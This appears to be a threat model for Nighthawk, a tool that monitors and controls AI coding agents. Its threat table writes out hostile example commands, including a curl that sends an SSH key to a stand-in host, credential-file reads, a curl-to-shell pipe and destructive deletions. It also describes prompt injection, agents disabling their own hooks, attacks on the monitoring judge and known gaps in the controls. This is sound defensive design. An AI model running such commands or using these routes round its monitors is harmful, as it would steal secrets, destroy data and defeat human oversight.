# Nighthawk threat model

## Assets
Source code and repositories, credentials and secrets on the machine (SSH keys,
cloud tokens, `.env` files, browser stores), cloud and SaaS accounts the agent can
reach, money (token spend), and the audit log itself.

## Actors
1. **Injected instructions:** hostile text in files, web pages, issues or MCP
   results that the agent follows. The main threat.
2. **Malicious or compromised MCP server or skill.**
3. **A confused agent** doing destructive work in good faith.
4. **A local attacker** who wants to hide what happened afterwards.

## Threats and controls

| Threat | Example | Control | Capture point |
| --- | --- | --- | --- |
| Exfiltration after prompt injection | `curl -d @~/.ssh/id_rsa https://evil.example` | Egress allowlist, secret path rules, LLM judge on suspicious sequences | Egress proxy, agent hook |
| Secret access | `cat .env`, reading `~/.aws/credentials` | Path rules on Read and Bash | Agent hook |
| Remote code execution | `curl ... \| sh` | Command rule | Agent hook, pane output match |
| Destructive commands | `rm -rf /`, `git push --force`, `DROP DATABASE` | Command rules | Agent hook |
| Unknown egress | new host in a script | Allowlist | Egress proxy |
| MCP tool list tampering | server adds or changes a tool description after approval | `tools/list` pinning by hash | MCP proxy |
| Disabling hooks | editing `~/.claude/settings.json`, unsetting proxy vars | Protected file rules, periodic hook integrity check | Agent hook, daemon |
| Runaway spend | loop burning tokens | Budget rules | Transcript tailer |
| Log tampering | deleting rows | Hash chain, external anchoring | Audit |
| Prompt injection against the LLM judge | event text telling the judge to allow | Judge is advisory, cannot downgrade a rule block, input fenced and redacted | Detect |

## Out of scope and known gaps
- A process that ignores proxy variables and opens raw sockets (closed on Linux in
  M3 by namespace mode).
- Agents with no pre-tool hook: Nighthawk can only observe and stop the pane
  after the fact.
- Kernel or root-level attackers.
- TLS content inspection (opt in only, M3).
